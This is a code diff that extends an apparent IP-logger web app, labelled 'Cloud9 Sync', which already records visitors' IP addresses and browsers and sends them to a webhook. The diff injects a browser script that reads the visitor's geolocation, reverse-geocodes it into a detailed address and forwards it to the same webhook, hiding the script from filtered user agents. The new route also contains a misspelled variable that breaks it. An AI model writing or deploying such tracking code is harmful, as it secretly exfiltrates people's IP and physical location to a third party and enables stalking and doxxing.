@@ -9,6 +9,22 @@ const channelID = process.env.channel_id;
 const ip_token = process.env.ip_token;
 const port = process.env.port || 3000;
 
+// Client-side JavaScript
+const script = `
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((position) => {
+      const { latitude, longitude } = position.coords;
+      fetch('/location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ latitude, longitude }),
+      });
+    });
+  }
+`;
+
 app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
@@ -20,6 +36,9 @@ app.get("/", async (req, res) => {
   const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
   try { 
+    if (!isUnwantedUserAgent) {
+      res.write(`<script>${script}</script>`);
+    }
     const embed = new MessageBuilder()
       .setTitle("Cloud9 Sync")
       .setDescription("New address logged.")
@@ -44,4 +63,17 @@ app.get("/", async (req, res) => {
   }
 });
 
+app.post("/location", async (req, res) => {
+  const { latitude, longitude } = req.body;
+  const location = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${latditude}+${longitude}&key=${opencage_api_key}`);
+  const locationData = await location.json();
+  const detailedLocation = locationData.results[0].formatted;
+
+    const embed = new MessageBuilder()
+    .addField("Detailed Location", detailedLocation)
+
+    await sendWebhook(channelID, embed);
+  res.status(200).end();
+});
+  
 app.listen(port, () => console.log(`App listening at http://localhost:${port}`));
